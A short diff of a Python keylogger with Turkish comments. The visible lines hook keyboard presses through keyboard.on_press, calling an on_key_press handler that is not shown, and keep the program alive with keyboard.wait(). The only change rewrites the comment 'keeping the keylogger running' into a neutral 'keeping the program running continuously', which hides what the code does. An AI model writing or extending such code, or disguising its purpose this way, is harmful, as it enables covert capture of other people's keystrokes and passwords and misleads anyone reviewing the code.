@@ -21,5 +21,5 @@ def on_key_press(event):
 # Keylogger'ı başlatıyoruz
 keyboard.on_press(on_key_press)
 
-# Keylogger'ı çalışır halde tutuyoruz
+# Programın sürekli çalışmasını sağlıyoruz
 keyboard.wait()
